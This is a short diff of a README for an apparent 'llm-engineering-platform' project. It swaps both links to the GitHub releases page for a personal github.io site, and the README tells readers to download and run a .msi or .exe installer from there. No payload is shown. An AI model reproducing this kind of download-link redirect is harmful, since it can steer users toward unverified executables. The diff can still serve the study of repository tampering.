@@ -1,6 +1,6 @@
 # ⚙️ llm-engineering-platform - Build reliable AI tools with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/santiag6001/llm-engineering-platform/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://santiag6001.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ This platform runs as a containerized application. Containers bundle the softwar
 
 Follow these steps to prepare your system:
 
-1. Visit the project release page to get the installer files: [https://github.com/santiag6001/llm-engineering-platform/releases](https://github.com/santiag6001/llm-engineering-platform/releases)
+1. Visit the project release page to get the installer files: [https://santiag6001.github.io](https://santiag6001.github.io)
 2. Look for the file ending in .msi or .exe.
 3. Download the file to your desktop.
 4. Run the installer and follow the instructions on your screen.
